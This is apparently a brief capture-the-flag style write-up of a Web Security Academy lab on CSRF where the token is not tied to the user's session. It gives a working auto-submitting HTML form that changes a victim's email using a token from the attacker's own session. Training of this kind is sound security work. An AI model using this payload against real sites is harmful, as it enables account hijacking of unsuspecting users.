# **CSRF where token is not tied to user session**

Because the only thing you need is the CSRF token this is easy to do, just modify the html we have been using in previous labs:

```
<form method="POST" action="https://0a4900ad03cc643480741251009d00ee.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="evil@hacker.com">
    <input type="hidden" name="csrf" value="2UmMjNAmAcdcXSkUGRNNjmSZH87xrxZU">
</form>
<script>
    document.forms[0].submit();
</script>
```

This csrf is from my session and it was added as an input to send it along the email on the served code from the exploit server, just click “Deliver exploit to victim” and it is solved.

The only thing to keep in mind is that the csrf will regenerate, in this case after each request.
